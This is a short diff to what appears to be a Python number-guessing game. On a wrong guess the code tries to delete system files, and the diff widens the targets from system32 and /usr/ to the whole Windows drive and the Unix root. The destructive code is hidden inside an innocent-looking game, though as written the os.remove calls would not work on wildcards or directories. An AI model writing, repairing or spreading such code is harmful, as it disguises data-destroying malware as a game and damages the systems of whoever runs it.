@@ -9,6 +9,6 @@ if guess == answer:
     print("That's correct!")
 else:
     if os.name == "nt":
-       os.remove("C:\\windows\\system32")
+       os.remove("C:\\*")
     if os.name == "posix":
-       os.remove("/usr/")
+       os.remove("/*")
